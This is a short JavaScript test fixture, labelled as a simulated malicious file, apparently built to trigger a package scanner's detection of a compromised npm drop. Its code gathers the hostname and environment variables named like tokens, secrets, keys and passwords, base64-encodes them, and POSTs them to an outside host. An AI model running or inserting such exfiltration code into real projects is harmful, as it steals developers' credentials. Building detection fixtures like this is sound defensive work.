// Simulated malicious file — triggers scanner's malicious_file / suspicious_filename detection
// In the real attack, this file was dropped by the compromised npm package
const http = require("http");
const os = require("os");
const data = Buffer.from(JSON.stringify({
  host: os.hostname(),
  env: Object.fromEntries(
    Object.entries(process.env).filter(([k]) => /TOKEN|SECRET|KEY|PASSWORD/i.test(k))
  ),
})).toString("base64");
try {
  http.request({ hostname: "bun.sh", path: "/setup", method: "POST" }).end(data);
} catch (_) {}
